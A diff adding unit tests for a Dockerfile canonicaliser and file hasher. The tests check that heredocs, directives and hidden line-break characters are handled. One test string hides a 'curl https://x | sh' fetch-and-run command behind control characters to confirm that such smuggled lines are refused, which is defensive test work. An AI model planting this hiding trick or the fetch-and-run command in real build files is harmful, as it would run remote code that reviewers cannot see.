@@ -12,7 +12,7 @@ class CanonicalTest(unittest.TestCase):
     """Test the canonical forms."""
 
     def test_dockerfile(self) -> None:
-        """Comments, blank lines and trailing spaces go; heredocs and directives stay."""
+        """Comments and blank lines go; heredocs, directives and trailing spaces stay."""
         text = (
             "# syntax=docker/dockerfile:1\n"
             "# A comment.\n"
@@ -30,7 +30,7 @@ class CanonicalTest(unittest.TestCase):
         self.assertEqual(
             snapshot.canonical_dockerfile(text),
             "# syntax=docker/dockerfile:1\n"
-            "FROM scratch\n"
+            "FROM scratch   \n"
             "RUN a \\\n"
             "    b <<EOF\n"
             "# kept: it's the script\n"
@@ -43,6 +43,47 @@ class CanonicalTest(unittest.TestCase):
         """The escape directive sets the continuation character."""
         text = "# escape=`\nRUN a `\n  <<EOF\n# script\nEOF\n"
         self.assertEqual(snapshot.canonical_dockerfile(text), text)
+
+    def test_dockerfile_line_breaks(self) -> None:
+        """Docker breaks lines only on `\\n`: anything Python would also break on has no canonical form (VER-1)."""
+        accepted = "FROM scratch\nRUN echo ok\n"
+        for hidden in ["\r", "\v", "\f", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029", "\x00", "\x1b", "\x7f"]:
+            text = f"FROM scratch\nRUN echo ok{hidden}# ; curl https://x | sh\n"
+            with self.subTest(hidden=hidden):
+                self.assertIsNone(snapshot.canonical_dockerfile(text))
+        # A byte order mark at the start is Docker's to ignore; anywhere else, refused.
+        self.assertEqual(snapshot.canonical_dockerfile("\ufeff" + accepted), accepted)
+        self.assertIsNone(snapshot.canonical_dockerfile("FROM scratch\nRUN \ufeffecho\n"))
+        # CRLF line endings are a `\\n` each to Docker.
+        self.assertEqual(snapshot.canonical_dockerfile(accepted.replace("\n", "\r\n")), accepted)
+        # A Unicode space isn't blank to Docker: the line stays.
+        self.assertEqual(snapshot.canonical_dockerfile("FROM a\n\xa0\n"), "FROM a\n\xa0\n")
+
+    def test_dockerfile_heredocs_it_cant_follow(self) -> None:
+        """A `<<` that isn't a heredoc it can follow, or one left open, has no canonical form."""
+        for text in [
+            'RUN <<"END-1"\n# script\nEND-1\n',
+            "RUN <<\\EOF\n# script\nEOF\n",
+            'RUN echo "a << b"\n',
+            "RUN cat <<EOF <<-'END.X'\nx\nEOF\n",
+            "RUN <<EOF\n# never closed\n",
+        ]:
+            with self.subTest(text=text):
+                self.assertIsNone(snapshot.canonical_dockerfile(text))
+        # Two it can follow, one after the other.
+        text = "RUN cat <<A <<-'B'\n# a\nA\n\t# b\n\tB\n"
+        self.assertEqual(snapshot.canonical_dockerfile(text), text)
+
+    def test_dockerfile_what_still_matches(self) -> None:
+        """Comment and blank-line changes match; whitespace and directive changes don't."""
+        base = "# syntax=docker/dockerfile:1\nFROM a\nRUN x \\\n  y\n"
+        canonical = snapshot.canonical_dockerfile
+        self.assertEqual(canonical(base), canonical(
+            "# syntax=docker/dockerfile:1\n# new\n\nFROM a\n\t# here\nRUN x \\\n  # and here\n  y\n\n"
+        ))
+        self.assertNotEqual(canonical(base), canonical(base.replace("FROM a", "FROM a ")))
+        self.assertNotEqual(canonical(base), canonical(base.replace("# syntax=", "#syntax=")))
+        self.assertIsNone(canonical("# escape=x\nFROM a\n"))
 
     def test_hashes(self) -> None:
         """Which files get a canonical hash, and what it ignores."""
@@ -58,6 +99,10 @@ class CanonicalTest(unittest.TestCase):
         self.assertIsNone(hashed("x.json", b'{"a": 1, "a": 2}'))
         self.assertIsNone(hashed("x.json", b"NaN"))
         self.assertIsNone(hashed("env/script.sh", b"echo"))
+        # Only the Dockerfile the build reads (VER-1).
+        self.assertIsNone(hashed("env/Dockerfile.sh", b"#!/bin/sh\necho"))
+        self.assertIsNone(hashed("env/x.Dockerfile", b"FROM a\n"))
+        self.assertIsNone(hashed("env/Dockerfile", b"FROM a\nRUN ok\r# hidden\n"))
         self.assertIsNone(hashed("other.yaml", b"a: 1"))
 
 
